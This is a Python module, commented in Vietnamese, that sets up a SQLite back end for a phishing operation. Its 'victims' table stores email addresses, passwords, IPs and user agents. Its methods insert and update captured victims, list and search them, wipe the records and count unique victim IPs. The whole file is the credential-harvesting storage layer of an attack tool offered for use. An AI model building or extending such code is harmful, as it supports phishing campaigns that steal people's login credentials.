#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sqlite3
import json
import hashlib
import bcrypt
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)

class Database:
    """Lớp quản lý database với đầy đủ tính năng"""
    
    def __init__(self, db_path: str = "data/victims.db"):
        self.db_path = Path(db_path)
        self.db_path.parent.mkdir(exist_ok=True)
        self._init_tables()
    
    def _init_tables(self):
        """Khởi tạo tất cả bảng cần thiết"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            c = conn.cursor()
            
            # Bảng victims - lưu thông tin nạn nhân
            c.execute('''
                CREATE TABLE IF NOT EXISTS victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ip TEXT,
                    user_agent TEXT,
                    location TEXT,
                    timestamp TEXT,
                    is_encrypted INTEGER DEFAULT 1,
                    attempts INTEGER DEFAULT 1,
                    last_attempt TEXT
                )
            ''')
            
            # Bảng logs - nhật ký hoạt động
            c.execute('''
                CREATE TABLE IF NOT EXISTS system_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    level TEXT,
                    message TEXT,
                    ip TEXT,
                    timestamp TEXT
                )
            ''')
            
            # Bảng tokens - lưu phiên bản
            c.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token TEXT UNIQUE,
                    victim_id INTEGER,
                    created_at TEXT,
                    expires_at TEXT,
                    FOREIGN KEY (victim_id) REFERENCES victims(id)
                )
            ''')
            
            # Bảng config - lưu cấu hình
            c.execute('''
                CREATE TABLE IF NOT EXISTS config (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TEXT
                )
            ''')
            
            conn.commit()
            conn.close()
            logger.info("✅ Database initialized successfully")
            
        except Exception as e:
            logger.error(f"❌ Database init failed: {e}")
            raise
    
    def insert_victim(self, email: str, password: str, ip: str, user_agent: str = "Unknown") -> bool:
        """Thêm nạn nhân mới với mã hóa bcrypt"""
        try:
            # Mã hóa password bằng bcrypt
            salt = bcrypt.gensalt()
            hashed_password = bcrypt.hashpw(password.encode('utf-8'), salt).decode('utf-8')
            
            conn = sqlite3.connect(str(self.db_path))
            c = conn.cursor()
            
            # Kiểm tra tồn tại
            c.execute('SELECT id, attempts FROM victims WHERE email = ?', (email,))
            existing = c.fetchone()
            
            if existing:
                # Cập nhật số lần thử
                c.execute('''
                    UPDATE victims 
                    SET attempts = attempts + 1, 
                        last_attempt = ?,
                        password = ?
                    WHERE email = ?
                ''', (datetime.now().isoformat(), hashed_password, email))
                logger.info(f"🔄 Updated existing victim: {email} (Attempt {existing[1] + 1})")
            else:
                # Thêm mới
                c.execute('''
                    INSERT INTO victims 
                    (email, password, ip, user_agent, timestamp, last_attempt)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (email, hashed_password, ip, user_agent, 
                      datetime.now().isoformat(), datetime.now().isoformat()))
                logger.info(f"✅ New victim saved: {email}")
            
            conn.commit()
            conn.close()
            return True
            
        except Exception as e:
            logger.error(f"❌ Insert victim failed: {e}")
            return False
    
    def get_victims(self, limit: int = 50) -> List[Dict]:
        """Lấy danh sách nạn nhân"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            
            c.execute('''
                SELECT id, email, ip, user_agent, timestamp, attempts, last_attempt
                FROM victims 
                ORDER BY id DESC 
                LIMIT ?
            ''', (limit,))
            
            results = [dict(row) for row in c.fetchall()]
            conn.close()
            return results
            
        except Exception as e:
            logger.error(f"❌ Get victims failed: {e}")
            return []
    
    def get_victim_by_email(self, email: str) -> Optional[Dict]:
        """Tìm kiếm nạn nhân theo email"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            
            c.execute('SELECT * FROM victims WHERE email = ?', (email,))
            row = c.fetchone()
            conn.close()
            
            return dict(row) if row else None
            
        except Exception as e:
            logger.error(f"❌ Get victim failed: {e}")
            return None
    
    def delete_victim(self, victim_id: int) -> bool:
        """Xóa nạn nhân theo ID"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            c = conn.cursor()
            c.execute('DELETE FROM victims WHERE id = ?', (victim_id,))
            conn.commit()
            conn.close()
            logger.info(f"🗑️ Deleted victim ID: {victim_id}")
            return True
        except Exception as e:
            logger.error(f"❌ Delete failed: {e}")
            return False
    
    def clear_all(self) -> bool:
        """Xóa toàn bộ dữ liệu"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            c = conn.cursor()
            c.execute('DELETE FROM victims')
            c.execute('DELETE FROM system_logs')
            conn.commit()
            conn.close()
            logger.info("💀 All data cleared")
            return True
        except Exception as e:
            logger.error(f"❌ Clear failed: {e}")
            return False
    
    def log_system(self, level: str, message: str, ip: str = "127.0.0.1"):
        """Ghi nhật ký hệ thống"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            c = conn.cursor()
            c.execute('''
                INSERT INTO system_logs (level, message, ip, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (level, message, ip, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"⚠️ Log failed: {e}")
    
    def get_stats(self) -> Dict:
        """Thống kê tổng quan"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            c = conn.cursor()
            
            stats = {}
            c.execute('SELECT COUNT(*) FROM victims')
            stats['total_victims'] = c.fetchone()[0]
            
            c.execute('SELECT COUNT(DISTINCT ip) FROM victims')
            stats['unique_ips'] = c.fetchone()[0]
            
            c.execute('SELECT SUM(attempts) FROM victims')
            stats['total_attempts'] = c.fetchone()[0] or 0
            
            conn.close()
            return stats
            
        except Exception as e:
            logger.error(f"❌ Stats failed: {e}")
            return {'total_victims': 0, 'unique_ips': 0, 'total_attempts': 0}

# Singleton
db = Database()
